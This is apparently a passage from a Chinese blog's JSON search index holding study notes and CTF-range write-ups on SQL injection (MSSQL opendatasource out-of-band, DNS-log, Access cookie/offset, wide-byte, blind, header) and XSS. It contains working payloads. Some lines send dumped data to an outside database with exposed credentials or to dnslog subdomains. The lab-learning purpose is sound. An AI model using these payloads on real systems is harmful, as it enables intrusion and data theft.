一.寻找输入点和输出点二.寻找没有被html实体编码的输入输出点,如果有那么尖括号会被转义,三种xss方式都得用到尖括号,就都会失效 小知识点 不要拿谷歌浏览器去做反射型xss,谷歌自己会做防护 Html中单引号可以闭合双引号) 靶场地址 传送门:https://wxnsoul.github.io/2020/04/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/反射型XSS/","date":"04-05","excerpt":"","tags":[{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"}]},{"title":"反弹注入--zkaq靶场","text":"注意点 Mssql的注释符必须用–+,不能用# Mssql的联合查询必须写union all Mssql的select 1,2,3得写select null,null,null Mssql有自带的数据库和表 先正着做一遍 查找注入点 1’ union all select null,null,null –+通过用数字和字符串替代null发现只要第二个null的地方有字符注入点,第一个有整型注入点(这就是因为mysql数据库会包容不兼容类型而mssql不会,所以得拿null去填充) 查找库名 1&#39; union all select null,name,id from dbo.sysdatabases --+ 注意,这里的name不是字段,不是表,而是描述表的信息,就像原理分析里面的唯一标识id一样,可以查找出自带库中的表的name和id. 查找用户创建的表名 1&#39; union all select id,name,null from dbo.sysobjects where xtype=&#39;U&#39; --+ 查找指定表中字段 1&#39; union all select null,name,id from dbo.sysdatabases --+ 查值 可以看到password和token字段比较可疑,去查一下 1’ union all select null,token,null from admin –+得出结果 接下来反着使用反弹注入做 查表 id=1&#39;;insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.amdin select id,name from dbo.sysobjects where xtype=&#39;U&#39; --+)在远程数据库里就会有数据插入(因为插入要求字段一样,所以单独创了一张表来配合使用,全部设置varchar即可) 查找指定表中字段 insert into opendatasource (‘sqloledb’, ‘server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666’) . wxchen666.dbo.id select name from dbo.syscolumns where id=1977058079 –+ 查值 insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.id select token from admin --+ 总结 就是一个语法得问题,记住就行了,然后多注意一些和mysql不同的操作","path":"2020/04/05/反弹注入-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"Mssql注入--反弹注入","text":"一、MSSQL反弹注入使用场景 明明是SQL的注射点却无法进行注射,注射工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注射结果等，这些都是在注射攻击中常常遇到的问题。为了解决以上这些疑难杂症，比较好的解决方法就是使用反弹注射技术，而反弹往射技术则需要依靠opendatasource函数支持.反弹注入也仅限于mysql 二、快速搭建一个MSSQL环境(骚姿势) http://www.webweb.com/(香港云)https://my.gearhost.com/Account/Login?ReturnUrl=%2fCloudSite(国外的虚拟主机)https://bccto.me/(十分钟邮箱)59.63.200.79:8015靶场去香港云或者虚拟云主机注册一个账号(用十分钟邮箱去注册),然后创立数据库即可三、MSSQL反弹注入语句解析 如何做mssql显错注入?Select 1,2,3这种语句是对mysql这样的对字符要求不严格的会生效,像access,mssql这样的拿select null,null,null去测试才对四.MSSQL的自带库 查询数据库select name from dbo. Sysdatabases自带数据库:master,tempdb查询表名select name from dbo. Sysobjects where xtype=&#39;U&#39;U是指user创建的表,S指系统创建的,所以知不知道库没有太大影响注意这张我创的test表(字段是a,b,c,d),但是他显示的有name,id,xtyoe,uid等等信息,这些都似乎用于描述表的,所以可以通过id来确定我要找的字段,id是唯一确定哪张表的这样查出的字段都是test表中的,不然会查出所有表中的所有字段 五.反弹注入语句 前面是常规操作,接下来时反弹注入 insert into opendatasource ( ‘sqloledb’ , ‘ serve r=SQL5009. webweb. com, 1433; uid=DB 1 4A5E44zkaq admin; pwd=Zkaqz kaq; database=DB14A5E44 zkaq’) .DB 1 4A5E44 zkaq. dbo. temp select * from admin—-.解析:sqloledb指连接mssql型数据库,erve r=SQL5009. webweb. com指你自己的数据库的外网地址.1433是指端口号,uid=DB 1 4A5E44zkaq admin指账号,pwd=Zkaqz kaq指连接的密码,database=DB14A5E44 zkaq’指连接哪个数据库,.DB 1 4A5E44 zkaq. dbo. temp是指库.表,就是选择哪个表的 整句话的意思就是把本地admin表(就是你攻击的表)的数据取出后插入到外网的自己连接的数据库上(迎合字段而创建)插入数据必须要满足字段相同Mssql的注释只有–+ 堆叠注入 你输入的sql语句可以多行执行.再参数后面加上; 然后再写sql语句.只需要在参数后面加上;然后;后面的sql语句能执行就是堆叠注入了 靶场地址 反弹注入传送门:https://wxnsoul.github.io/2020/04/05/%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5-zkaqb%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/Mssql注入-反弹注入/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"DNS注入--zkaq靶场","text":"绕过安全狗 直接传参id=1&#39;and 1=1 -- qwe被狗咬住了查看源码发现过滤了and关键字.这边利用了apache得一个特性,碰到不认识的域名就会往前解析,所以输入 /1.txt?id=1 and 1=1 – qwe就绕了过去,因为不认识txt所以跑去解析index3.php了,还接受了id参数,但是使用 select database()是没有数据返回的. DNS攻击流程 登录到dnslog.cn网站随便获取一个域名，然后拼接想要的内容 /1.txt?id=1 and (select load_file(concat(“//“,(select database()),’.wwwwwwxxx.e6zfnp.dnslog.cn/dw’))) – qwe很明显得到了库名．这边非常需要注意语法,自己因为语法不熟练导致卡了很久,有select语句的记得用()把语句扩起来,让其作为sql语句执行,我一开始写的/1.txt?id=1 and select load_file(concat(&quot;//&quot;,(select database()),&#39;.wwwwwwxxx.e6zfnp.dnslog.cn/dw&#39;)) – qwe &lt;br&gt;/1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select table_name from information_schema.tables where table_schema=database()limit 1,1),&#39;.chenjiayn.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出表名为admin,news /1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,1),&#39;.chenjiayan.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出字段为id,username,password /1.txt?id=1 and (select load_file(concat(“//“,(select password from admin limit 0,1),’.chenjiayan.e6zfnp.dnslog.cn/dw’))) – qwe得到flag.需要注意因为dns注入只能返回一条数据,所以需要记得使用limit来限定","path":"2020/04/05/DNS注入-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"}]},{"title":"Mysql注入--DNS注入","text":"核心 通过dnslog(日志)把盲注变成有显错注入 函数介绍 LOAD_FILE()读取文件的函数读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_ allowed_ _packet (限制server接受的数据包大小函数，默认1MB)。如果该文件不存在或无法读取，因为前面的条件之一不满足， 函数返回NULL。这个功能不是默认开启的，需要在mysq|配置文件加一-句secure_file_priv=)效果图: Apache特性 当apache解析域名碰到不认识的东西时就会往前解析.所以当被拦截时就可以加一些不认识的东西让他去解析,比如1.txtand concat(“//”,select database(),”wdis.dnslog”) – wq)就可以把通过把库名拼接到dnslog上进行查看,但是只能拼接一条语句,所以只能用limit来限制 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/05/DNS%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/Mysql注入-DNS注入/","date":"04-05","excerpt":"","tags":[{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"access注入--zkaq靶场2","text":"判断是否存在cookie注入 实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 order by 26&quot;)这边order by 26页面返回正常,27返回错误,说明有26个字段 判断注入点 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin&quot;)页面返回三个注入点.但是呢,其实还有一个隐藏的注入点是没有发现的.右击靶场中那张没有加载出来的字段,检查元素会发现还有一个25是输出点判断表中字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,admin.* from admin&quot;)一个一个的删除直到第十个的时候发现页面返回正常了,说明admin中有十六个字段.为啥不返回数据呢?因为注入点是3,5,7,现在是11-26 根据注入点爆出值 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,admin.*,27 from admin&quot;)可以看到flag就在admin表中的最后一个字段的值 zkaq{f0e12dafb6} 总结 access的魅力就在于不知道字段名但是可以得到数据 如果输出点很少,偏移注入不能把所有的字段值爆破出来.就像这里的3,5,7,25是输出点,怎样偏移都没有办吧把中的字段的数据弄出来","path":"2020/04/05/access注入-zkaq靶场2/","date":"04-05","excerpt":"","tags":[{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--正则表达式--zkaq靶场","text":"源码 )很明显就是考察正则表达式的./zkaq.*key.{2,9}:\\/.*\\/(key*key)/i第一次大致的解读就是zkaq任意字符key任意字符(长度2-9):/任意字符/key任意字符key 并且不区分大小写,直接正确了zkaq2key66://keykey 总结 其实自己对{}这个限定符的理解还不是很到位,{}限定的还是直接相关的前面的一个字,只有把前面内容用括号括起来才会要求所有内容全部重复 对.这个通配符,,单独使用.去匹配时只要不全都是制表符就会匹配成功,以前以为 如:a.就只能匹配两个字符,其实不然,其实他的意思是a后面第一个字符可以为不是制表符的任意字符(且必须有一个字符) .*就表示任意字符,且出现次数为0-n次 拓展","path":"2020/04/05/zkaq-正则表达式-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"解决tags和categories点击后页面为空的问题","text":")标签页设置了下拉单,最大数量为三,点击之后也可以跳转到相应的标签分类.但是点击省略号之后跳出的内容却为空就像这样.查阅了很多资料之后终于找到原因了,原来是source/tags/index.md里面没有进行设施.在多加一行layout: &quot;tags&quot;之后就可以成功的跳转了 效果图: 原文地址:https://blog.csdn.net/winter_chen001/article/details/79719154","path":"2020/04/05/解决tags和categories点击后页面为空的问题/","date":"04-05","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"access注入--zkaq靶场","text":"判断是否存在cookie注入 实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;id=&quot;+escape(&quot;171 order by 11&quot;)此时页面才错误,说明有十个字段 判断注入点 access与mysql不同之处就在于这,必须要加个from table_name不然无法执行document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;)找到注入点为2,3 猜值 document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,password ,4,5,6,7,8,9,10 from admin&quot;)因为access只有一个库,也没有什么自带库,,只能靠猜表,猜字段来作题,下节课可以教使用偏移注入来猜字段,这里的passord字段是风哥直接告诉我们的,不用纠结,不告诉也只能靠猜跑出来有点奇怪.. b9a2a2b5dffb918c)后来问了风哥才知道要去md5解密一下,解密出来是welcome.一开始死活解密不出是因为自己少抄了一个,,,md5只能加密成16或32位的(Md5加密后的特点) 进入后台 拿到了admin用户的密码后,按照提示进入后台,拿到flag)","path":"2020/04/04/access注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"}]},{"title":"数据库注入--Access注入","text":"前言 数据库有很多Mysql Access MSSQL Oracle不同的数据库，虽然语句类似但是在渗透测试的时候是不同。本章研究不同数据库的注入方法还有一-些骚姿势 cookie注入简介 Cookie他并不安全,没有绝对的安全用户的体验性和安全是需要平衡,如果高度安全每访问一个页面最后登陆一-次,那么用户的体验肯定是很差的.所以就出现了cookie来记录用户身份提高用户体验Cookie注入核心在于注入方式,不是说只有access数据库才有cookie注入,只不过一般来说access数据库都很有可能存在cookie注入,毕竟是2000的产品Php常用版本是5.2,所以一般$_REQYEST[ ]是可以接收cookie传参的(低于5.4就可以) 什么情况使用cookie注入? 当get,post注入被拦截时 cookie和session的关系 如果cookie代表你(用户)的身份信息,那么session代表着警察局(服务器)内存储你的信息的地方 怎样修改cookie 通过burp抓包注意需要全部转化成url编码再放包 通过浏览器设置Application这里可以直接添加,也不需要转url码 通过控制台设置) 如何判断是否存在cookie注入 在有get传参的地方,比如id=171,把参数去掉后,通过burp抓包后在cookie最后加上;再加上一个空格(一定要)然后再加上id=171,放过后发现依旧能够达到预期的页面,这就说明cookie信息也被拼接写入数据库了 再使用and 1=1,1=2之类的来判断是否存在注入,不过需要注意的是cookie传参值需要url编码http://www.3464.com/tools/StrToHex/JiaMi.asp这是在线编码网站(使用控制台cookie传参得时候一定要把url栏中得参数去掉,不然会先用url栏中得数据,从而不使用cookie的) 和其他数据库的不同点 Access 数据库只有一个数据库,所有的表都只能在同一个数据库内,所以判断表名只能强行猜………经验来说一般有admin,user,news,job等.不过也可以用sqlmap去跑,去试而且,就msyql找注入点用select 1,2,3,4这样即可,但是access就必须select 1,2,3,4 from table_name才可以执行 如何使用sqlmap跑cookie注入? PY -2 sqlmap. Py -u “http://59. 63. 200. 79: 8004/ shovnews. asp” –cookie “id=171”注意url这里没有传参的,是吧参数单独放到后面用双引号引起来,告诉SQLmap跑这个注入点 直接抓包 -r抓 偏移注入原理核心:纵然不知道字段名但还是可以获得数据不知道表名,,就要去爆破主要用到union all 此条联合查询语句,union all和union得区别就是union会删除查询到得结果集中相同得数据,而union all不会再利用union all它要求必须字段数要相同,所以可以来判断到底表中有几个字段如图所示,这样就能判断出test表中有三个字段.再改成select * from table_name就可以爆出字段 注意点union查询前后字段数必须匹配.如果前面得字段少,后面偏移注入得字段多事没有办法成功得,所以union前面得字段要尽可能多,起码比后面得多.有些时候在源码中可以找到一些隐蔽得注入点,这些就需要自己去发现了 流程 判断注入点 order by判断字段数 判断表名(只能爆破) 联合查询 获取表中列数(知道存在几列以及输出点) 开始偏移注入,获取表中的数据 拓展万一需要的字段字段值不在第一条,在后面要怎么办?这时候就需要多了解一些知识了.首先,select * from flag union select 1,2,3 order by 1问:这个默认的升序排序是只对union 以后的数据进行排序还是把结果集合在一起之后再排序?答:是结合在一起之后在排序的,加个desc 变成降序也一样.问:如何取出第N条数据?答:这就需要加一个top关键字了.top 1就是取出第1条数据,top 2就是取出前两条数据.取出的数据进行排序后在输出.所以可能会发送top 1,top 2,top 3..输出的页面是一样的,那是因为虽然取出的数据变多了,但是排在最前面的那条数据其实是没有变过的 靶场地址 cookie注入传送门:https://wxnsoul.github.io/2020/04/05/zkaq-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-zkaq%E9%9D%B6%E5%9C%BA/偏移注入传送门:https://wxnsoul.github.io/2020/04/05/access%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA2/","path":"2020/04/04/数据库注入-Access注入/","date":"04-04","excerpt":"","tags":[{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"宽字节注入--zkaq靶场","text":"源码审计 审计源码,发现对/’”\\做了过滤 preg_replace($pattern, $replacement, $string)pattern表示正则表达式或是其他规则,replacement表示需要替换的内容,string表示需要搜索的字符串 string preg_quote ( string $str [, string $delimiter = NULL ] )preg_quote — 转义正则表达式字符正则表达式字符有这些: . \\ + * ? [ ^ ] $ ( ) { } = ! &lt; &gt; | : - 注意 / 不是正则表达式特殊字符。如果指定了可选参数 delimiter，它也会被转义.远么审计结果发现这句话表示数据库编码方式是GBK编码,可以尝试宽字节注入 尝试SQL注入 宽字节注入确实有效果,足足页面等了十五秒.. 判断字段数 1%df’ order by 4– qwe使用order by直到第四个失败,所以总共有三个字段1%df’ union select 1,2,3– wer 判断注入点 很明显2,3是注入点 查找表 查找字段 查到值 遇见的问题 在写table_name=’china_flag’的时候出错了,因为单引号被过滤了,自己潜意识里认为只需要绕过把变量引起来的单引号就可以了.那么这样子怎么办呢?我们可以有两种绕过方法使用子查询绕过(也可以使用十六进制) pass-17 post传参 这道题的区别就在于get传参变成了post传参,然后也关闭了回显,得用post类型的布尔盲注.Get传参和post的传参对这题的影响:url传参参数会进行url编码,但是post传参不会,必须自己手动通过burp改才行 两种解法 通过burp把参数改成十六进制 直接输入一个汉字来和magic_quotes_gpc产生的/闭合,url编码中一个汉字占三个字节,在数据库中和/结合后变成四字节就是两个中文了从而实现绕过 判断字段数 第四个的时候不行了,判断出是三个字段 判断表长 很明显长为10 爆破表名 表为china_flag 查找字段长 )这边又忘了单引号绕过,使用十六进制绕过表名 爆字段 跑出是C_flag 爆值 长11,最后跑出是zKaQ-Kzj+mz 总的来说宽字节注入也不难,搞懂原理后和前面都一样","path":"2020/04/04/宽字节注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--宽字节注入","text":"magic_quotes_gpc魔术引号 $sql = ‘ select* from admin where username=&#39;‘.$REQUEST [ ‘ username’] .’&#39; and password =&#39;‘.$REQUEST [ ‘ password’ ]这是一个标准的sql语句,没有做过任何过滤所以使用万能密码很容易实现注入,使用魔术引号之后呢,就会自动在单引号,双引号,反斜杠之前自动加一个反斜杠(PHP5.4以后就取消了这个功能,可以在php.ini中查看是否开启)单引号和双引号内的一切都是字符串，那我们输入的东西如果不能闭合掉单引号和双引号，我们的输入就不会当作代码执行，就无法产生SQL注入，那我们该怎么办? 示例 )5.4以下的php中的php.ini文件中默认打开这个功能,此时要是传入’”/就i会发生这样的事情 GBK编码格式 Gbk编译的汉字占用两个字节,但是utf-8编译的汉字占用三个字节什么是url编码?其实就是十六进制编码,会把输入的十六进制转换成十进制然后对应ASCII码输出.比如%27转换成十进制就是39,对应的ascii就是单引号 宽字节注入原理 魔术引号把用户输入的单引号变成\\’之后,如果数据库编码不是utf-8编码就可能造成宽字节注入.因为\\的url编码是%5c,是占用一个字节的,如果用户输入%df’就会变成%df%5c从而组成一个双字节汉字’運’从而是的魔术引号加的/失效注意,只有get传参和cookie传参的时候在地址栏输入的参数才会被url编码,如果是post传参,基本上不可能被url编码先编译.所以如果是post传参,可以使用burp抓包后修改十六进制文件,或者是直接在表单中输入 汉’,也可以成功.因为utf-8编码中中文是三个字节的,加上’就是四个字节,到了GBK的数据库中就会变成两个中文字符如果使用sqlmap去跑,需要手动去闭合一些东西后再加*,毕竟是工具,比较呆示例:加了%df之后多出的β就会和/一起再数据库中组成一个汉字,从而实现了绕过 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-宽字节注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入绕过姿势","text":"#被过滤 使用%23绕过 单引号过滤 宽字节绕过 转十六进制 写子查询","path":"2020/04/04/SQL注入绕过姿势/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"}]},{"title":"盲注--zkaq靶场","text":"因为关闭了回显,只能看页面返回是否正常,所以使用盲注来完成 测试是否可以注入 可以得知是可以进行注入的判断表的长度 1 and length((select table_name from information_schema.tables where table_schema=database()))&gt;0表长为6 爆破表名 1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97)使用burp跑包得出表为loflag 判断字段长 得知flag长度为8,在跑包得出所以flagBurp跑出密码为zKaQ-QQQ, zKaQ-RD, zKaQ-Moren, zKaQ-time-hj其实很早就拿到flag了,问了很多人之后才明白靶场里的flag提交的时候手打过不了,,,我是在QQ里打字之后复制粘贴过去才过的 另外两题也没什么大区别,只不过一个#被吃掉了,转义成%23即可,一个改成了get传参.不过get传参那题有个坑,flag被改了位置,峰哥说是为了培养我们思维不固化 关于注释符 1.# 2.– qwe 3.–+,有时候#会变成锚点,所以不得不改变注释符,但是–qwe只能在get注入里面使用,有局限性 sqlmap解题 也可以使用sqlmap去跑库,–flush-session语句用来清除缓存","path":"2020/04/04/盲注-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--盲注","text":"为何要使用盲注 盲注主要是因为管理员关闭了回显,你无法得知返回得报错,所以只能通过盲注来实现注入攻击 常用函数 strlen(),substr(str,pos,len),acsii(),sleep(),if(flag?true:false) 主要流程select * from table_name where id=1 and 1=1页面正常返回select * from table_name where id=1 and 1=2页面错误返回所以开始利用这个页面返回是否正常来完成注入 select * from table_name where id=1 and length(database())&gt;5 开始根据页面返回来判断数据库字符长度,然后疯狂改变5测出真实长度 select * from table_name where id=1 and acsii(substr(database(),1,1))=111然后就是配合截取函数和acscii函数一个一个的判断字符.这可以使用burp功能模块来帮助快速完成,或者是sqlmap.不然如果太长手工破解会很累 select * from table_name where id=1 and length(select table_name from database())=5测试第一个表名的长度… select * from table_name where id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1))&gt;97然后就是一个一个的判断表名 以此类推…. 靶场实战 传送地址: 延时注入延时注入也是盲注的一种,只不过又换了两个函数利用,变成了if和sleep.举个小小的栗子,select * from table_name where id=1 and if(length(database())&lt;11,sleep(5),1) -- wqed&quot;如果数据库名&lt;11就沉睡5秒 注入优先级显错注入&gt;报错(updatexml(0x7e,sql,1))&gt;布尔盲注&gt;延时注入","path":"2020/04/04/SQL注入-盲注/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"HEAD注入--zkaq靶场","text":"源码 很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了. burp过滤出自己想要的内容 如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,尽量使用避免中文)看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456 判断是否可以头注入 从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!&#39; or sleep(5),1)#返回页面确实延迟了五秒多,说明是存在head注入的.这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了 使用xmlupdate函数爆破表名 ‘ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)# 这里需要注意表名是flag_head,~是concat函数连接上去的 爆破字段 ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)# 爆破值 ‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#成功得出flag 另外两个靶场也是差不多的这个是获取referer的这个是获取X-Forwarded=For的基本结构,直接修改就好","path":"2020/04/04/HEAD注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--HEAD注入","text":"HEAD注入介绍 函数介绍 0x表示16进制,7e表示的是~这个特殊符号,出现在了路径中所以会报错 实操 select * from user where ID= 1 and updatexml(1,concat(0x7e,(select database())),1)注意,只是返回一行数据,需要用limit去操作返回哪一行 为何要HEAD注入 有的数据库管理员会关闭报错,关闭掉数据库所有报错之后肯定是不会成功的,但是一般不会有管理人员回去关闭掉所有报错,就比如说insert插入操作.但是insert操作不会有回显,所以我们需要让她去强行报错.会什么浏览器会返回我们报错的数据呢?因为php处理MySQL时遇见了致命性错误会告诉用户出错了 X-Forwarded-For 用于获取你的真实ip,如果你用了透明代理,传输上去的数据包里会有X-Forwarded_For函数来告诉服务器你得ip,当然这个我们可以通过拦截来修改 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-HEAD注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"POST注入--zkaq靶场","text":"靶场地址:https://hack.zkaq.cn/ )题目长这样,尝试使用万能密码很明显成功登录了,接下来就可以查询了 首先查字段数select *from user where username =&#39;1&#39; or 1=1 order by 3#&#39; and password=&#39;&#39;select *from user where username =&#39;&#39; or 1=1 order by 4#&#39; and password=&#39;&#39;可以得知有三个字段 接着找出注入点select *from user where username =&#39;&#39; union select 1,2,3#&#39; and password=&#39;&#39;可以看出2,3是注入点 爆表(爆不爆库无所谓,直接拿database()代替就可以)select *from user where username =&#39;&#39; union select 1,2,table_name from information_schema.tables where table_schema=database()#&#39; and password=&#39;&#39;查找出flag表 爆字段select *from user where username =&#39;&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39; and password=&#39;&#39;看到是flag字段 查值select *from user where username =&#39;&#39; union select 1,2,group_concat(flag) from flag#&#39; and password=&#39;&#39;可以爆出字段值注:尽量使用limit一个一个取值而不要group_concat,因为只能输出一行,有时候数据会出书不完整 另外一个靶场也只需要注意闭合的问题,流程一样 利用sqlmap工具先使用burp抓住带有cookie信息的包,然后复制粘贴到txt文件里,把需要注入的点改成星号*,告诉sqlmap这里是注入点,然后使用-r打开文件就行,这里依旧需要使用—dbs等命令来暴库,一开始以为不需要python sqlmap.py -r 1.txt --dbs --level 3(默认的level是力度不够的) python sqlmap.py -r 1.txt -D error --tables --level 3python sqlmap.py -r 1.txt -D error -T error_flag --columns --level 3python sqlmap.py -r 1.txt -D error -T error_flag -C flag --dump --level 3","path":"2020/04/04/POST注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--POST注入","text":"SQL注入原理分析 